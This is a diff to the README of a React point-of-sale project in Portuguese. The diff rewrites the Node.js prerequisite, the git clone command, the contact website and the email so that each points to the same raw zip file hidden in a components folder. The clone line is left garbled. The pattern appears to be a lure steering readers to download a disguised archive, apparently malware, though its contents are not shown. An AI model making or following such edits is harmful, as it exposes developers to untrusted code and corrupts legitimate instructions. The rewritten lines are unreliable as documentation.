@@ -81,14 +81,14 @@ Sistema de Ponto de Venda completo desenvolvido em React para gestão de vendas,
 ## 🚀 Como Executar
 
 ### Pré-requisitos
-- Node.js 16+ 
+- https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip 16+ 
 - npm ou yarn
 
 ### Instalação
 
 1. Clone o repositório:
 ```bash
-git clone https://github.com/[SEU_USERNAME]/gestao-sergio-imports-pdv.git
+git clone https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip[SEU_USERNAME]https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip
 cd gestao-sergio-imports-pdv
 ```
 
@@ -205,8 +205,8 @@ Este projeto está sob a licença MIT. Veja o arquivo [LICENSE](LICENSE) para de
 ## 📞 Contato
 
 **Sérgio Imports**
-- Website: [sergio-imports.com](https://sergio-imports.com)
-- Email: contato@sergioimports.com
+- Website: [https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip](https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip)
+- Email: https://github.com/Se198361/gestao-sergio-imports-pdv/raw/refs/heads/main/src/components/Exchanges/gestao_imports_pdv_sergio_v2.6.zip
 - Telefone: (11) 99999-9999
 
 ---
